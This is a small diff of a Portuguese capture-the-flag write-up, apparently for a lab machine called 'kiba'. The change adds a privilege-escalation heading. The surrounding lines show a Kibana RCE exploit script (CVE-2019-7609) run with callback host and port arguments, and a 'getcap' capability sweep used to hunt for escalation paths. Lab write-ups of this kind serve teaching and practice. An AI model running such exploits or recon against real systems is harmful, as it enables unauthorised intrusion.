@@ -45,7 +45,7 @@ python2.7 CVE-2019-7609-kibana-rce.py -u http://10.10.0.81:5601/ -host IP -port 
 kiba@ubuntu:/home/kiba$ cat user.txt
 ```
 
-
+* ### Escalando o previlégio.
 ```bash
 kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
 ```
